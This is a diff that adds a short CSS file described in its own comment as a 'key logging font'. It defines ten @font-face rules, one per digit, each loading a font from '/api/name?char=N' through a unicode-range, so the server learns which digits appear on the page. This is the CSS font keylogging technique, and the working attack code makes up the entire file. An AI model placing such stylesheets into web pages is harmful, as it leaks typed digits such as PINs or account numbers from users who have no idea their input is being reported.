@@ -1,0 +1,14 @@
+/*
+Number characters for key logging font.
+ */
+
+@font-face { font-family: x; src: url('/api/name?char=0'), local(Comic Sans); unicode-range: U+30; }
+@font-face { font-family: x; src: url('/api/name?char=1'), local(Comic Sans); unicode-range: U+31; }
+@font-face { font-family: x; src: url('/api/name?char=2'), local(Comic Sans); unicode-range: U+32; }
+@font-face { font-family: x; src: url('/api/name?char=3'), local(Comic Sans); unicode-range: U+33; }
+@font-face { font-family: x; src: url('/api/name?char=4'), local(Comic Sans); unicode-range: U+34; }
+@font-face { font-family: x; src: url('/api/name?char=5'), local(Comic Sans); unicode-range: U+35; }
+@font-face { font-family: x; src: url('/api/name?char=6'), local(Comic Sans); unicode-range: U+36; }
+@font-face { font-family: x; src: url('/api/name?char=7'), local(Comic Sans); unicode-range: U+37; }
+@font-face { font-family: x; src: url('/api/name?char=8'), local(Comic Sans); unicode-range: U+38; }
+@font-face { font-family: x; src: url('/api/name?char=9'), local(Comic Sans); unicode-range: U+39; }
